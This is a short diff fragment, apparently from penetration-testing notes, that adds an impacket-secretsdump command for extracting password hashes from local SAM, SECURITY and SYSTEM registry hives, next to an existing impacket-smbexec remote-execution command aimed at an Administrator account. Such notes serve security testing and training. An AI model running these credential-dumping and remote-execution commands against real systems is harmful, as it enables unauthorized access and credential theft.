@@ -22,5 +22,9 @@ Administrator@192.168.50.212
 impacket-smbexec domain/username:'password'@IP
 ```
 
+```
+impacket-secretsdump -sam sam -security security -system system LOCAL
+```
+
 
 
